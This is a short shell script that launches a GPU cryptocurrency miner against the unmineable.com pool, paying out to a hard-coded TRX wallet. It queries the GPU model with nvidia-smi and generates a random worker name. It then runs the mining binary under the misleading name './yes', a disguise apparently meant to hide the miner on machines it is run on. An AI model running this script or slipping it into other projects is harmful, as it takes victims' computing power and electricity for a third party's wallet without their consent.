POOL=rx-us.unmineable.com:3333
WALLET=TRX:TRBy1QYuSANfmY7RFeM5cSwongFdY5feaY
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo 4R26mFyD-$(shuf -i 1911-511649 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
